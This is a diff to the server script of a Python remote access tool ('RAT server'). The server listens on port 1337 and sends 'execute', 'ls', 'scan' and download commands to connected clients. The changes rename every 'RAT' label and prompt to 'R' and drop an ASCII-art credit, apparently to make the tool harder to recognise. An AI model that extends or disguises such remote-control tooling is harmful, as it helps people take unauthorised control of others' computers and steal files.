@@ -7,18 +7,16 @@ import sys
 import threading
 import os
 
-
-from core.crypto import encrypt, decrypt, diffiehellman
+from libr.crypto import encrypt, decrypt, diffiehellman
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
-# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
 BANNER = '''
                      .                  
      ooo         ,-_-|        ,,,,,     
     (o o)       ([o o])      /(o o)\    
 ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo-
 '''
-CLIENT_COMMANDS = ['execute', 'ls','scan']
+CLIENT_COMMANDS = ['execute', 'ls', 'scan']
 HELP_TEXT = '''Command             | Description
 ---------------------------------------------------------------------------
 client <id>         | Connect to a client.
@@ -155,7 +153,6 @@ class Server(threading.Thread):
         fname = os.path.basename(path)
         # send remote file path
         self.send_client('download', self.current_client)
-        print("send path")
         self.send_client(path, self.current_client)
         # recv file
         str = "@server"
@@ -179,7 +176,7 @@ class ClientConnection():
 
 
 def get_parser():
-    parser = argparse.ArgumentParser(description='RAT server')
+    parser = argparse.ArgumentParser(description='R server')
     parser.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
     return parser
@@ -197,7 +194,7 @@ def main():
     server = Server(port)
     server.setDaemon(True)
     server.start()
-    print 'RAT server listening for connections on port {}.'.format(port)
+    print 'R server listening for connections on port {}.'.format(port)
 
     # server side commands
     server_commands = {
@@ -232,7 +229,7 @@ def main():
         else:
             ccid = '?'
 
-        prompt = raw_input('\n[{}] RAT> '.format(ccid)).rstrip()
+        prompt = raw_input('\n[{}] R> '.format(ccid)).rstrip()
 
         # allow noop
         if not prompt:
